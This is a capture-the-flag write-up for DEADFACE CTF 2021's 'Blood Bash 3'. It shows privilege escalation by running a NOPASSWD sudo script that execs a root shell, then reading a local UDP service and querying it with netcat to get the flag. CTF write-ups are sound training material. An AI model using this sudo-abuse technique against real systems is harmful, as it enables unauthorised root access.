---
description: Blood Bash 3 DEADFACE CTF 2021 challenge write up.
---

# Blood Bash 3

## Enumeration

The challenge says that this flag is not in a normal file so I started looking around for programs or something similar. I found this:
```bash
bl0ody_mary@961430c4b52e:~$ cat /opt/start.sh 
#!/bin/bash

sudo /usr/sbin/srv &
exec /bin/bash
```

We can't read that `srv` program but I also saw this:
```bash
bl0ody_mary@961430c4b52e:~$ sudo -l 
Matching Defaults entries for bl0ody_mary on 961430c4b52e:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bl0ody_mary may run the following commands on 961430c4b52e:
    (ALL) NOPASSWD: /opt/start.sh, /usr/sbin/srv
```

## We are root!

Since we can use `sudo` to execute that start thing we can get a root shell simply by executing it:
```bash
bl0ody_mary@961430c4b52e:~$ sudo /opt/start.sh 
root@961430c4b52e:/home/bl0ody_mary# Traceback (most recent call last):
  File "/usr/sbin/srv", line 14, in <module>
    udp_server_socket.bind((host, port))
OSError: [Errno 98] Address already in use

root@961430c4b52e:/home/bl0ody_mary#
```

Looks like that `srv` program is trying to bind to a port, let's check the program now:
```bash
root@961430c4b52e:/home/bl0ody_mary# cat /usr/sbin/srv
#!/usr/bin/env python3

import socket as s
from binascii import hexlify as h, unhexlify as u

host = "127.0.0.1"
port = 43526
buffer = 1024

msg = b"666c61677b6f70656e5f706f727428616c29737d"
bytes_to_send = u(msg)

udp_server_socket = s.socket(s.AF_INET, s.SOCK_DGRAM)
udp_server_socket.bind((host, port))

while True:
        bytes_address_pair = udp_server_socket.recvfrom(buffer)
        #message = bytes_address_pair[0]
        address = bytes_address_pair[1]

        udp_server_socket.sendto(bytes_to_send, address)
```
So it is hosting an interesting UDP service in the port `43526`.

### A flag!

Connecting to the service with netcat and pressing enter gives the flag:
```bash
root@961430c4b52e:/home/bl0ody_mary# nc -u 127.0.0.1 43526

flag{open_port(al)s}
```
